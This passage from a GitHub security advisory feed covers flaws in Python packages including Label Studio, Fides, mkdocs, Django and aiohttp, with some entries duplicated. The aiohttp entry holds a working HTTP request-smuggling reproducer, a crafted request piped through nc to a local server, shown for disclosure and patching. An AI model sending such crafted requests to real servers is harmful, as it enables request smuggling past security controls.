EDITOR_KEYMAP = json.dumps(get_env("EDITOR_KEYMAP"))

from label_studio import __version__
from label_studio.core.utils import sentry
sentry.init_sentry(release_name='label-studio', release_version=__version__)

# we should do it after sentry init
from label_studio.core.utils.common import collect_versions
versions = collect_versions()

# in Label Studio Community version, feature flags are always ON
FEATURE_FLAGS_DEFAULT_VALUE = True
# or if file is not set, default is using offline mode
FEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)

from core.utils.io import find_file
FEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')
FEATURE_FLAGS_FROM_FILE = True
try:
    from core.utils.io import find_node
    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')
except IOError:
    FEATURE_FLAGS_FROM_FILE = False

STORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)
</code></pre>
<h3 id="impact">Impact</h3>
<p>The impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/heartexlabs/label-studio/security/advisories/GHSA-cpmr-mw4j-99r7">https://github.com/heartexlabs/label-studio/security/advisories/GHSA-cpmr-mw4j-99r7</a></li>
<li><a href="https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119">https://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/60a3ef57a22c50d7230a56c11d85e14454c99a28">https://github.com/HumanSignal/label-studio/commit/60a3ef57a22c50d7230a56c11d85e14454c99a28</a></li>
<li><a href="https://github.com/advisories/GHSA-cpmr-mw4j-99r7">https://github.com/advisories/GHSA-cpmr-mw4j-99r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cpmr-mw4j-99r7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-03-24T22:04:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ethyca-fides] Ethyca Fides HTML Injection Vulnerability in HTML-Formatted DSR Packages]]></title>
        <id>https://github.com/advisories/GHSA-3vpf-mcj7-5h38</id>
        <link href="https://github.com/advisories/GHSA-3vpf-mcj7-5h38"/>
        <updated>2023-11-09T16:14:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Fides web application allows data subject users to request access to their personal data. If the request is approved by the data controller user operating the Fides web application, the data subject's personal data can then retrieved from connected systems and data stores before being bundled together as a data subject access request package for the data subject to download. Supported data formats for the package include json and csv, but the most commonly used format is a series of HTML files compressed in a ZIP file. Once downloaded and unzipped, the data subject user can browse the HTML files on their local machine.</p>
<p>It was identified that there was no validation of input coming from e.g. the connected systems and data stores which is later reflected in the downloaded data. This can result in an HTML injection that can be abused e.g. for phishing attacks or malicious JavaScript code execution, but only in the context of the data subject's browser accessing a HTML page using the <code>file://</code> protocol.</p>
<p>Exploitation is limited to rogue Admin UI users, malicious connected system / data store users, and the data subject user if tricked via social engineering into submitting malicious data themselves.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in Fides version <code>TBC</code>. Users are advised to upgrade to this version or later to secure their systems against this threat.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Only Fides deployments which have been configured to use <code>html</code> as the package format in the <a href="https://docs.ethyca.com/dev-docs/configuration/privacy-requests/storage-destinations">storage destination</a> are vulnerable. Using <code>json</code> or <code>csv</code> instead eliminates this vulnerability. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ethyca/fides/security/advisories/GHSA-3vpf-mcj7-5h38">https://github.com/ethyca/fides/security/advisories/GHSA-3vpf-mcj7-5h38</a></li>
<li><a href="https://github.com/ethyca/fides/commit/50360a0e24aac858459806bb140bb1c4b71e67a1">https://github.com/ethyca/fides/commit/50360a0e24aac858459806bb140bb1c4b71e67a1</a></li>
<li><a href="https://github.com/ethyca/fides/releases/tag/2.23.3">https://github.com/ethyca/fides/releases/tag/2.23.3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47114">https://nvd.nist.gov/vuln/detail/CVE-2023-47114</a></li>
<li><a href="https://github.com/advisories/GHSA-3vpf-mcj7-5h38">https://github.com/advisories/GHSA-3vpf-mcj7-5h38</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3vpf-mcj7-5h38</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-08T17:52:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jefferson] sviehb/jefferson vulnerable to path traversal]]></title>
        <id>https://github.com/advisories/GHSA-7jrw-p8jc-v6qw</id>
        <link href="https://github.com/advisories/GHSA-7jrw-p8jc-v6qw"/>
        <updated>2023-11-07T23:14:25.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability has been found in the sviehb/jefferson JFFS2 filesystem extraction tool. This vulnerability affects unknown code of the file <code>src/scripts/jefferson</code>. The manipulation leads to path traversal. The attack can be initiated remotely. Upgrading to version 0.4 is able to address this issue as it includes <a href="https://github.com/sviehb/jefferson/commit/53b3f2fc34af0bb32afbcee29d18213e61471d87">https://github.com/sviehb/jefferson/commit/53b3f2fc34af0bb32afbcee29d18213e61471d87</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4885">https://nvd.nist.gov/vuln/detail/CVE-2022-4885</a></li>
<li><a href="https://github.com/sviehb/jefferson/pull/36">https://github.com/sviehb/jefferson/pull/36</a></li>
<li><a href="https://github.com/sviehb/jefferson/commit/53b3f2fc34af0bb32afbcee29d18213e61471d87">https://github.com/sviehb/jefferson/commit/53b3f2fc34af0bb32afbcee29d18213e61471d87</a></li>
<li><a href="https://github.com/sviehb/jefferson/releases/tag/v0.4">https://github.com/sviehb/jefferson/releases/tag/v0.4</a></li>
<li><a href="https://vuldb.com/?ctiid.218020">https://vuldb.com/?ctiid.218020</a></li>
<li><a href="https://vuldb.com/?id.218020">https://vuldb.com/?id.218020</a></li>
<li><a href="https://github.com/advisories/GHSA-7jrw-p8jc-v6qw">https://github.com/advisories/GHSA-7jrw-p8jc-v6qw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7jrw-p8jc-v6qw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-01-11T18:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django-photologue] django-photologue vulnerable to Cross-site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-287q-jfcp-9vhv</id>
        <link href="https://github.com/advisories/GHSA-287q-jfcp-9vhv"/>
        <updated>2023-11-07T22:16:58.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in django-photologue up to 3.15.1 and classified as problematic. Affected by this issue is some unknown functionality of the file photologue/templates/photologue/photo_detail.html of the component Default Template Handler. The manipulation of the argument object.caption leads to cross site scripting. The attack may be launched remotely. Upgrading to version 3.16 is able to address this issue. The name of the patch is 960cb060ce5e2964e6d716ff787c72fc18a371e7. It is recommended to apply a patch to fix this issue. VDB-215906 is the identifier assigned to this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4526">https://nvd.nist.gov/vuln/detail/CVE-2022-4526</a></li>
<li><a href="https://github.com/richardbarran/django-photologue/issues/223">https://github.com/richardbarran/django-photologue/issues/223</a></li>
<li><a href="https://github.com/richardbarran/django-photologue/commit/960cb060ce5e2964e6d716ff787c72fc18a371e7">https://github.com/richardbarran/django-photologue/commit/960cb060ce5e2964e6d716ff787c72fc18a371e7</a></li>
<li><a href="https://vuldb.com/?id.215906">https://vuldb.com/?id.215906</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django-photologue/PYSEC-2022-43061.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django-photologue/PYSEC-2022-43061.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-287q-jfcp-9vhv">https://github.com/advisories/GHSA-287q-jfcp-9vhv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-287q-jfcp-9vhv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-15T21:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PaddlePaddle] PaddlePaddle vulnerable to Code Injection]]></title>
        <id>https://github.com/advisories/GHSA-gcjf-29m9-888q</id>
        <link href="https://github.com/advisories/GHSA-gcjf-29m9-888q"/>
        <updated>2023-11-07T22:15:17.000Z</updated>
        <content type="html"><![CDATA[<p>Code injection in <code>paddle.audio.functional.get_window</code> in PaddlePaddle 2.4.0-rc0 allows arbitrary code execution. A <a href="https://github.com/PaddlePaddle/Paddle/commit/26c419ca386aeae3c461faf2b828d00b48e908eb">patch</a> is available on the <code>develop</code> branch of the repository and anticipated to be part of a 2.4 release.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-46742">https://nvd.nist.gov/vuln/detail/CVE-2022-46742</a></li>
<li><a href="https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2022-002.md">https://github.com/PaddlePaddle/Paddle/blob/develop/security/advisory/pdsa-2022-002.md</a></li>
<li><a href="https://github.com/PaddlePaddle/Paddle/pull/47386">https://github.com/PaddlePaddle/Paddle/pull/47386</a></li>
<li><a href="https://github.com/PaddlePaddle/Paddle/commit/26c419ca386aeae3c461faf2b828d00b48e908eb">https://github.com/PaddlePaddle/Paddle/commit/26c419ca386aeae3c461faf2b828d00b48e908eb</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/paddlepaddle/PYSEC-2022-43063.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/paddlepaddle/PYSEC-2022-43063.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-gcjf-29m9-888q">https://github.com/advisories/GHSA-gcjf-29m9-888q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gcjf-29m9-888q</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-12-07T09:30:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mkdocs] Directory traversal in mkdocs]]></title>
        <id>https://github.com/advisories/GHSA-qh9q-34h6-hcv9</id>
        <link href="https://github.com/advisories/GHSA-qh9q-34h6-hcv9"/>
        <updated>2023-11-07T22:12:37.000Z</updated>
        <content type="html"><![CDATA[<p>The mkdocs 1.2.2 built-in dev-server allows directory traversal using the port 8000, enabling remote exploitation to obtain :sensitive information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-40978">https://nvd.nist.gov/vuln/detail/CVE-2021-40978</a></li>
<li><a href="https://github.com/mkdocs/mkdocs/issues/2601">https://github.com/mkdocs/mkdocs/issues/2601</a></li>
<li><a href="https://github.com/mkdocs/mkdocs">https://github.com/mkdocs/mkdocs</a></li>
<li><a href="https://github.com/nisdn/CVE-2021-40978/issues/1">https://github.com/nisdn/CVE-2021-40978/issues/1</a></li>
<li><a href="https://github.com/mkdocs/mkdocs/pull/2604">https://github.com/mkdocs/mkdocs/pull/2604</a></li>
<li><a href="https://github.com/mkdocs/mkdocs/releases/tag/1.2.3">https://github.com/mkdocs/mkdocs/releases/tag/1.2.3</a></li>
<li><a href="https://github.com/nisdn/CVE-2021-40978">https://github.com/nisdn/CVE-2021-40978</a></li>
<li><a href="https://github.com/mkdocs/mkdocs/commit/57540911a0d632674dd23edec765189f96f84f6b">https://github.com/mkdocs/mkdocs/commit/57540911a0d632674dd23edec765189f96f84f6b</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mkdocs/PYSEC-2021-878.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mkdocs/PYSEC-2021-878.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-qh9q-34h6-hcv9">https://github.com/advisories/GHSA-qh9q-34h6-hcv9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qh9q-34h6-hcv9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2021-10-12T18:48:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Plone] Chameleon in Plone allows Authentication Bypass]]></title>
        <id>https://github.com/advisories/GHSA-6h8x-73fx-q2h9</id>
        <link href="https://github.com/advisories/GHSA-6h8x-73fx-q2h9"/>
        <updated>2023-11-07T18:12:29.000Z</updated>
        <content type="html"><![CDATA[<p>Chameleon (five.pt) in Plone 5.0rc1 through 5.1a1 allows remote authenticated users to bypass Restricted Python by leveraging permissions to create or edit templates.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-4043">https://nvd.nist.gov/vuln/detail/CVE-2016-4043</a></li>
<li><a href="https://plone.org/security/hotfix/20160419/bypass-restricted-python">https://plone.org/security/hotfix/20160419/bypass-restricted-python</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/04/20/3">http://www.openwall.com/lists/oss-security/2016/04/20/3</a></li>
<li><a href="https://github.com/advisories/GHSA-6h8x-73fx-q2h9">https://github.com/advisories/GHSA-6h8x-73fx-q2h9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6h8x-73fx-q2h9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T02:57:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Plone] Chameleon in Plone allows Authentication Bypass]]></title>
        <id>https://github.com/advisories/GHSA-6h8x-73fx-q2h9</id>
        <link href="https://github.com/advisories/GHSA-6h8x-73fx-q2h9"/>
        <updated>2023-11-07T18:12:29.000Z</updated>
        <content type="html"><![CDATA[<p>Chameleon (five.pt) in Plone 5.0rc1 through 5.1a1 allows remote authenticated users to bypass Restricted Python by leveraging permissions to create or edit templates.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-4043">https://nvd.nist.gov/vuln/detail/CVE-2016-4043</a></li>
<li><a href="https://plone.org/security/hotfix/20160419/bypass-restricted-python">https://plone.org/security/hotfix/20160419/bypass-restricted-python</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/04/20/3">http://www.openwall.com/lists/oss-security/2016/04/20/3</a></li>
<li><a href="https://github.com/advisories/GHSA-6h8x-73fx-q2h9">https://github.com/advisories/GHSA-6h8x-73fx-q2h9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6h8x-73fx-q2h9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-17T02:57:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] aiohttp.web.Application vulnerable to HTTP request smuggling via llhttp HTTP request parser]]></title>
        <id>https://github.com/advisories/GHSA-45c4-8wx5-qw6w</id>
        <link href="https://github.com/advisories/GHSA-45c4-8wx5-qw6w"/>
        <updated>2023-11-06T16:34:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>aiohttp v3.8.4 and earlier are <a href="https://github.com/aio-libs/aiohttp/blob/v3.8.4/.gitmodules">bundled with llhttp v6.0.6</a> which is vulnerable to CVE-2023-30589. The vulnerable code is used by aiohttp for its HTTP request parser when available which is the default case when installing from a wheel.</p>
<p>This vulnerability only affects users of aiohttp as an HTTP server (ie <code>aiohttp.Application</code>), you are not affected by this vulnerability if you are using aiohttp as an HTTP client library (ie <code>aiohttp.ClientSession</code>).</p>
<h3 id="reproducer">Reproducer</h3>
<pre><code class="language-python">from aiohttp import web

async def example(request: web.Request):
    headers = dict(request.headers)
    body = await request.content.read()
    return web.Response(text=f"headers: {headers} body: {body}")

app = web.Application()
app.add_routes([web.post('/', example)])
web.run_app(app)
</code></pre>
<p>Sending a crafted HTTP request will cause the server to misinterpret one of the HTTP header values leading to HTTP request smuggling.</p>
<pre><code class="language-console">$ printf "POST / HTTP/1.1\r\nHost: localhost:8080\r\nX-Abc: \rxTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n" \
  | nc localhost 8080

Expected output:
  headers: {'Host': 'localhost:8080', 'X-Abc': '\rxTransfer-Encoding: chunked'} body: b''

Actual output (note that 'Transfer-Encoding: chunked' is an HTTP header now and body is treated differently)
  headers: {'Host': 'localhost:8080', 'X-Abc': '', 'Transfer-Encoding': 'chunked'} body: b'A'
</code></pre>
<h3 id="patches">Patches</h3>
<p>Upgrade to the latest version of aiohttp to resolve this vulnerability. It has been fixed in v3.8.5: <a href="https://pypi.org/project/aiohttp/3.8.5/"><code>pip install aiohttp &gt;= 3.8.5</code></a></p>
<h3 id="workarounds">Workarounds</h3>
<p>If you aren't able to upgrade you can reinstall aiohttp using <code>AIOHTTP_NO_EXTENSIONS=1</code> as an environment variable to disable the llhttp HTTP request parser implementation. The pure Python implementation isn't vulnerable to request smuggling:</p>
<pre><code class="language-console">$ python -m pip uninstall --yes aiohttp
$ AIOHTTP_NO_EXTENSIONS=1 python -m pip install --no-binary=aiohttp --no-cache aiohttp
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30589">https://nvd.nist.gov/vuln/detail/CVE-2023-30589</a></li>
<li><a href="https://hackerone.com/reports/2001873">https://hackerone.com/reports/2001873</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-45c4-8wx5-qw6w">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-45c4-8wx5-qw6w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37276">https://nvd.nist.gov/vuln/detail/CVE-2023-37276</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/9337fb3f2ab2b5f38d7e98a194bde6f7e3d16c40">https://github.com/aio-libs/aiohttp/commit/9337fb3f2ab2b5f38d7e98a194bde6f7e3d16c40</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/9c13a52c21c23dfdb49ed89418d28a5b116d0681">https://github.com/aio-libs/aiohttp/commit/9c13a52c21c23dfdb49ed89418d28a5b116d0681</a></li>
<li><a href="https://hackerone.com/reports/2001873">https://hackerone.com/reports/2001873</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/blob/v3.8.4/.gitmodules">https://github.com/aio-libs/aiohttp/blob/v3.8.4/.gitmodules</a></li>
<li><a href="https://github.com/aio-libs/aiohttp">https://github.com/aio-libs/aiohttp</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/aiohttp/PYSEC-2023-120.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/aiohttp/PYSEC-2023-120.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-45c4-8wx5-qw6w">https://github.com/advisories/GHSA-45c4-8wx5-qw6w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-45c4-8wx5-qw6w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-20T14:52:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pillow] Pillow Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8ghj-p4vj-mr35</id>
        <link href="https://github.com/advisories/GHSA-8ghj-p4vj-mr35"/>
        <updated>2023-11-03T19:39:44.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Pillow before 10.0.0. It is a Denial of Service that uncontrollably allocates memory to process a given task, potentially causing a service to crash by having it run out of memory. This occurs for truetype in ImageFont when textlength in an ImageDraw instance operates on a long text argument.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-44271">https://nvd.nist.gov/vuln/detail/CVE-2023-44271</a></li>
<li><a href="https://github.com/python-pillow/Pillow/pull/7244">https://github.com/python-pillow/Pillow/pull/7244</a></li>
<li><a href="https://github.com/python-pillow/Pillow/commit/1fe1bb49c452b0318cad12ea9d97c3bef188e9a7">https://github.com/python-pillow/Pillow/commit/1fe1bb49c452b0318cad12ea9d97c3bef188e9a7</a></li>
<li><a href="https://devhub.checkmarx.com/cve-details/CVE-2023-44271/">https://devhub.checkmarx.com/cve-details/CVE-2023-44271/</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2023-227.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2023-227.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-8ghj-p4vj-mr35">https://github.com/advisories/GHSA-8ghj-p4vj-mr35</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8ghj-p4vj-mr35</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-03T06:36:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django] Django Denial-of-service in django.utils.text.Truncator]]></title>
        <id>https://github.com/advisories/GHSA-h8gc-pgj2-vjm3</id>
        <link href="https://github.com/advisories/GHSA-h8gc-pgj2-vjm3"/>
        <updated>2023-11-03T19:35:28.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.22, 4.1 before 4.1.12, and 4.2 before 4.2.6, the django.utils.text.Truncator chars() and words() methods (when used with html=True) are subject to a potential DoS (denial of service) attack via certain inputs with very long, potentially malformed HTML text. The chars() and words() methods are used to implement the truncatechars_html and truncatewords_html template filters, which are thus also vulnerable. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-43665">https://nvd.nist.gov/vuln/detail/CVE-2023-43665</a></li>
<li><a href="https://docs.djangoproject.com/en/4.2/releases/security/">https://docs.djangoproject.com/en/4.2/releases/security/</a></li>
<li><a href="https://groups.google.com/forum/#!forum/django-announce">https://groups.google.com/forum/#!forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2023/oct/04/security-releases/">https://www.djangoproject.com/weblog/2023/oct/04/security-releases/</a></li>
<li><a href="https://github.com/django/django/commit/be9c27c4d18c2e6a5be8af4e53c0797440794473">https://github.com/django/django/commit/be9c27c4d18c2e6a5be8af4e53c0797440794473</a></li>
<li><a href="https://github.com/django/django/commit/c7b7024742250414e426ad49fb80db943e7ba4e8">https://github.com/django/django/commit/c7b7024742250414e426ad49fb80db943e7ba4e8</a></li>
<li><a href="https://github.com/django/django/commit/ccdade1a0262537868d7ca64374de3d957ca50c5">https://github.com/django/django/commit/ccdade1a0262537868d7ca64374de3d957ca50c5</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2023-226.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2023-226.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-h8gc-pgj2-vjm3">https://github.com/advisories/GHSA-h8gc-pgj2-vjm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h8gc-pgj2-vjm3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-03T06:36:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django] Django Denial-of-service in django.utils.text.Truncator]]></title>
        <id>https://github.com/advisories/GHSA-h8gc-pgj2-vjm3</id>
        <link href="https://github.com/advisories/GHSA-h8gc-pgj2-vjm3"/>
        <updated>2023-11-03T19:35:28.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.22, 4.1 before 4.1.12, and 4.2 before 4.2.6, the django.utils.text.Truncator chars() and words() methods (when used with html=True) are subject to a potential DoS (denial of service) attack via certain inputs with very long, potentially malformed HTML text. The chars() and words() methods are used to implement the truncatechars_html and truncatewords_html template filters, which are thus also vulnerable. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-43665">https://nvd.nist.gov/vuln/detail/CVE-2023-43665</a></li>
<li><a href="https://docs.djangoproject.com/en/4.2/releases/security/">https://docs.djangoproject.com/en/4.2/releases/security/</a></li>
<li><a href="https://groups.google.com/forum/#!forum/django-announce">https://groups.google.com/forum/#!forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2023/oct/04/security-releases/">https://www.djangoproject.com/weblog/2023/oct/04/security-releases/</a></li>
<li><a href="https://github.com/django/django/commit/be9c27c4d18c2e6a5be8af4e53c0797440794473">https://github.com/django/django/commit/be9c27c4d18c2e6a5be8af4e53c0797440794473</a></li>
<li><a href="https://github.com/django/django/commit/c7b7024742250414e426ad49fb80db943e7ba4e8">https://github.com/django/django/commit/c7b7024742250414e426ad49fb80db943e7ba4e8</a></li>
<li><a href="https://github.com/django/django/commit/ccdade1a0262537868d7ca64374de3d957ca50c5">https://github.com/django/django/commit/ccdade1a0262537868d7ca64374de3d957ca50c5</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2023-226.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2023-226.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-h8gc-pgj2-vjm3">https://github.com/advisories/GHSA-h8gc-pgj2-vjm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h8gc-pgj2-vjm3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-03T06:36:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[django] Django Denial-of-service in django.utils.text.Truncator]]></title>
        <id>https://github.com/advisories/GHSA-h8gc-pgj2-vjm3</id>
        <link href="https://github.com/advisories/GHSA-h8gc-pgj2-vjm3"/>
        <updated>2023-11-03T19:35:28.000Z</updated>
        <content type="html"><![CDATA[<p>In Django 3.2 before 3.2.22, 4.1 before 4.1.12, and 4.2 before 4.2.6, the django.utils.text.Truncator chars() and words() methods (when used with html=True) are subject to a potential DoS (denial of service) attack via certain inputs with very long, potentially malformed HTML text. The chars() and words() methods are used to implement the truncatechars_html and truncatewords_html template filters, which are thus also vulnerable. NOTE: this issue exists because of an incomplete fix for CVE-2019-14232.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-43665">https://nvd.nist.gov/vuln/detail/CVE-2023-43665</a></li>
<li><a href="https://docs.djangoproject.com/en/4.2/releases/security/">https://docs.djangoproject.com/en/4.2/releases/security/</a></li>
<li><a href="https://groups.google.com/forum/#!forum/django-announce">https://groups.google.com/forum/#!forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2023/oct/04/security-releases/">https://www.djangoproject.com/weblog/2023/oct/04/security-releases/</a></li>
<li><a href="https://github.com/django/django/commit/be9c27c4d18c2e6a5be8af4e53c0797440794473">https://github.com/django/django/commit/be9c27c4d18c2e6a5be8af4e53c0797440794473</a></li>
<li><a href="https://github.com/django/django/commit/c7b7024742250414e426ad49fb80db943e7ba4e8">https://github.com/django/django/commit/c7b7024742250414e426ad49fb80db943e7ba4e8</a></li>
<li><a href="https://github.com/django/django/commit/ccdade1a0262537868d7ca64374de3d957ca50c5">https://github.com/django/django/commit/ccdade1a0262537868d7ca64374de3d957ca50c5</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2023-226.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2023-226.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-h8gc-pgj2-vjm3">https://github.com/advisories/GHSA-h8gc-pgj2-vjm3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h8gc-pgj2-vjm3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-03T06:36:30.000Z</published>
    </entry>
</feed>